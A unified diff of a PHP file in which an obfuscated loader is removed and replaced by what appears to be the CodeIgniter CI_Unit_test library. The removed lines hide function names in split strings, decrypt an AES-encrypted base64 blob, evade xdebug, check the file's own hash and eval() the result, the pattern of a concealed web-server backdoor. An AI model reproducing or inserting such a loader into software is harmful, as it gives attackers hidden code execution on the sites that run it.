@@ -1,28 +1,355 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_s60rvqyf=('bas'.'e64'.'_de'.'cod'.'e');
-$_onotfrh6=('gzu'.'nco'.'mpr'.'ess');
-$_q1ygoduf=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_z6rq6vey='/QYV+k14';
-$_p22xhm2a='t0fr3y3W';
-$_fxkpxxvj='ahGCtFkP';
-$_olwhgef6='I8OZNUtHDLM=';
-$_ukrrk9ku='dJHtcFHj';
-$_vyk35hcd='pz8NnQ==';
-$_bzrio5f9='wXLaaUZi';
-$_eyny5j9o='nu0Wt6a0';
-$_d23oy1q0=$_s60rvqyf($_z6rq6vey.$_fxkpxxvj.$_p22xhm2a.$_ukrrk9ku.$_olwhgef6);
-$_lu0tvwsm=$_s60rvqyf($_bzrio5f9.$_eyny5j9o.$_vyk35hcd);
-$_hwxw08dd=$_s60rvqyf('XyzaUOgiz3uSW2Q1I6sKHr+6/BSYcU7UateOgKFzeynVT7jbv24uHpbzErb8FA1JQ992mqhGTJiZwBu7Oxc7zbEjaMBhSUDpKLCj3pqREyiF8L859DJg099cUBW+laVFvZmrqL4P2APLKXUKNc6ftbgn4+4H0BXTNPnvbG29aHvLkaDzLP3WhOx2tGQxDZXt10QSgrO3LAtcbq0Eluc3wUQo3xrhD+nfBalZjPSJh9Y/C3KKwG1z2z/Iv8g9y5jnTiB2liWa1VvS+i/RnxqgvuJ27CVsQIPkzj+ix2hQoQpEuFOnc7DYKhst1WIS/9atvOIjknBfQOHxL1sV0i2TcMf6dvVCcoyqhzLG5qpoPt1A22Bynya8cAZwco17RU+JRJE7UMaBF8nIsfa+SV7DeU0oX+xZh5N8WdjoAiS6H3gz1mfUWUi72deblti1XlBAOl5vy1aa5OcqQGHAO7QlXwhoFtaY9Bqz3UkU041sXB/zgan0uXgYHLr/oUoA6e6MEDs7n/ImusIEEOWIqDGaMQOceKdw+S1VZbi5Id0XhN8hv7XA72LbQAcPiDTuIXfpJiWghsnIzvLMJ/6nfdjtaggnY06vQqrYVbWWMpgGGmnhccYuO7A7wYTZwmuz5P61HR2MHkYTUBBpAZone0StWE4dToaFw/ibX4qY3ss1SK1i9APrEJjLkwZjFp6iyQIR5wXqNs/Lurhx83ArhaiIG9xAsw8umuZxaAoEhUrnp/w1vkocjcOP58UOmqYOkI2o6PDmtM3anJeW15RvxTKN5Rx30hj2EavY6ui79fSwhX4+g7XvQ4lnP8oujooXF8EbXt3juLhVoSac2q3FWDyhcXsoCcNfcgmILiKSfvgOVEp1KBhgm/44lsQkAAAJPppGn2a8n2X/saCHJonIxZfgqRPpvU+z2Q1LmgUMxYmpi+cQ7neSPhUE0SXfrNvCj4kzS1lX8g2J37PUsYpMFW7Bd4XLmIWbyZxlimewZ5NLAe3DgnoVO6XdXVowgcFWr4WpIXlJw4pMA1LUlBR4TCT2V2QobKnHMsilUG4JMz7X7R3DDgG5pnPrXIpYUZEuwQ2lcnxSH8au1MuEkU7Jg9TkYID5YkHvIOrUE0fL5gQ5+BPHQi1P5vd65so6wlN558WUMSdKVOnrRK9OOAncD8hSSFt0soSJ2YkV0smLeYE0If6dc/jS3pY/FZsFdzVMBKGlcg4AJqXHdR5VC8ppJuf/SIQ4KySCq1fw5803RvtGPlb9c6S90Vp6qTXS7wrsoRCR2EgzZR455UpEG8WLiKRathLkJRfNW+WJjBu9nMBomTy3UAjMdxhEc94O83tLyuYDU133rn7P/3NxgIFx2KJ9pD9wG1eJxe8qrGa72qwJ5jq1uhkYfiwnnTyQWnf8eU9vPFMmitaZFP55NPi3GrTYmSIcUTjVl0H3X0lDwmSTDul7QhyWGLqD1Bzr8nyg4O4StZle48Gt1isnVoBNrVcLnROJirNZv2QN8FIjKIN2t3XnBRpo3ZV4rBkjvX8VkAKkhjaPItKjWb1p51cYbWy8G43ur9ZahyrPb6Pzh+XkW11KPWDNiZCRJQPk+EdaRHibWnCVKmouGbcJBWaQYO8ye4sMDDsAaDf4EOytlYtUt8SyLNgHU9HcZlrommqun7igvzkKhKWvqMVuvMCfk9t8MaljWY9LjnmMtjrcnbF9ztGpc5kxlrrKQSKeqCsuxHQC+940Yb9U2rjkW49PUWsbe2rAjHQJzghZ3zmtSjRQrnmJNzf4OqyXw+KR2UYrgVMIjePugOq8Ejzi6LWHeSuEznptHigzFK3Y5KfQd6uwOjbYBEg6tVtbkxK1B/5drzcS4Kc2P6wyUVWbNsiI8fR3WE/cVtPM25gbLibJOHk/RasGHvNeVTZ2g5tAqYs5yOn/');
-$_lxyujwrm=$_q1ygoduf($_hwxw08dd,'aes-256-cbc',$_d23oy1q0,OPENSSL_RAW_DATA,$_lu0tvwsm);
-if($_lxyujwrm===false){exit;}
-$_j4zh2vfg=$_onotfrh6($_lxyujwrm);
-if($_j4zh2vfg===false){exit;}
-$_waion38j='296e838457d9ae30f35d83621ca498c48976e79142da27dbf2dfd9b32ab71158';
-$_akmw2lh6=@file_get_contents(__FILE__);
-if($_akmw2lh6!==false){
-$_c316vuez=str_replace($_waion38j,"0000000000000000000000000000000000000000000000000000000000000000",$_akmw2lh6);
-$_rv6j5h76=hash("sha256",$_c316vuez);
-if($_rv6j5h76!==$_waion38j){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Unit_test {
+
+
+
+
+
+public $active = TRUE;
+
+
+
+
+
+public $results = array();
+
+
+
+
+
+
+
+public $strict = FALSE;
+
+
+
+
+
+protected $_template = NULL;
+
+
+
+
+
+protected $_template_rows = NULL;
+
+
+
+
+
+protected $_test_items_visible = array(
+'test_name',
+'test_datatype',
+'res_datatype',
+'result',
+'file',
+'line',
+'notes'
+);
+
+
+
+
+
+
+public function __construct()
+{
+log_message('info', 'Unit Testing Class Initialized');
 }
-eval($_j4zh2vfg);
+
+
+
+
+
+
+
+
+
+public function set_test_items($items)
+{
+if ( ! empty($items) && is_array($items))
+{
+$this->_test_items_visible = $items;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function run($test, $expected = TRUE, $test_name = 'undefined', $notes = '')
+{
+if ($this->active === FALSE)
+{
+return FALSE;
+}
+if (in_array($expected, array('is_object', 'is_string', 'is_bool', 'is_true', 'is_false', 'is_int', 'is_numeric', 'is_float', 'is_double', 'is_array', 'is_null', 'is_resource'), TRUE))
+{
+$result = $expected($test);
+$extype = str_replace(array('true', 'false'), 'bool', str_replace('is_', '', $expected));
+}
+else
+{
+$result = ($this->strict === TRUE) ? ($test === $expected) : ($test == $expected);
+$extype = gettype($expected);
+}
+$back = $this->_backtrace();
+$report = array (
+'test_name' => $test_name,
+'test_datatype' => gettype($test),
+'res_datatype' => $extype,
+'result' => ($result === TRUE) ? 'passed' : 'failed',
+'file' => $back['file'],
+'line' => $back['line'],
+'notes' => $notes
+);
+$this->results[] = $report;
+return $this->report($this->result(array($report)));
+}
+
+
+
+
+
+
+
+
+
+public function report($result = array())
+{
+if (count($result) === 0)
+{
+$result = $this->result();
+}
+$CI =& get_instance();
+$CI->load->language('unit_test');
+$this->_parse_template();
+$r = '';
+foreach ($result as $res)
+{
+$table = '';
+foreach ($res as $key => $val)
+{
+if ($key === $CI->lang->line('ut_result'))
+{
+if ($val === $CI->lang->line('ut_passed'))
+{
+$val = '<span style="color: #0C0;">'.$val.'</span>';
+}
+elseif ($val === $CI->lang->line('ut_failed'))
+{
+$val = '<span style="color: #C00;">'.$val.'</span>';
+}
+}
+$table .= str_replace(array('{item}', '{result}'), array($key, $val), $this->_template_rows);
+}
+$r .= str_replace('{rows}', $table, $this->_template);
+}
+return $r;
+}
+
+
+
+
+
+
+
+
+
+public function use_strict($state = TRUE)
+{
+$this->strict = (bool) $state;
+}
+
+
+
+
+
+
+
+
+
+public function active($state = TRUE)
+{
+$this->active = (bool) $state;
+}
+
+
+
+
+
+
+
+
+
+public function result($results = array())
+{
+$CI =& get_instance();
+$CI->load->language('unit_test');
+if (count($results) === 0)
+{
+$results = $this->results;
+}
+$retval = array();
+foreach ($results as $result)
+{
+$temp = array();
+foreach ($result as $key => $val)
+{
+if ( ! in_array($key, $this->_test_items_visible))
+{
+continue;
+}
+elseif (in_array($key, array('test_name', 'test_datatype', 'res_datatype', 'result'), TRUE))
+{
+if (FALSE !== ($line = $CI->lang->line(strtolower('ut_'.$val), FALSE)))
+{
+$val = $line;
+}
+}
+$temp[$CI->lang->line('ut_'.$key, FALSE)] = $val;
+}
+$retval[] = $temp;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function set_template($template)
+{
+$this->_template = $template;
+}
+
+
+
+
+
+
+
+
+protected function _backtrace()
+{
+$back = debug_backtrace();
+return array(
+'file' => (isset($back[1]['file']) ? $back[1]['file'] : ''),
+'line' => (isset($back[1]['line']) ? $back[1]['line'] : '')
+);
+}
+
+
+
+
+
+
+protected function _default_template()
+{
+$this->_template = "\n".'<table style="width:100%; font-size:small; margin:10px 0; border-collapse:collapse; border:1px solid #CCC;">{rows}'."\n</table>";
+$this->_template_rows = "\n\t<tr>\n\t\t".'<th style="text-align: left; border-bottom:1px solid #CCC;">{item}</th>'
+."\n\t\t".'<td style="border-bottom:1px solid #CCC;">{result}</td>'."\n\t</tr>";
+}
+
+
+
+
+
+
+
+
+protected function _parse_template()
+{
+if ($this->_template_rows !== NULL)
+{
+return;
+}
+if ($this->_template === NULL OR ! preg_match('/\{rows\}(.*?)\{\/rows\}/si', $this->_template, $match))
+{
+$this->_default_template();
+return;
+}
+$this->_template_rows = $match[1];
+$this->_template = str_replace($match[0], '{rows}', $this->_template);
+}
+}
+
+
+
+
+
+
+function is_true($test)
+{
+return ($test === TRUE);
+}
+
+
+
+
+
+
+function is_false($test)
+{
+return ($test === FALSE);
+}
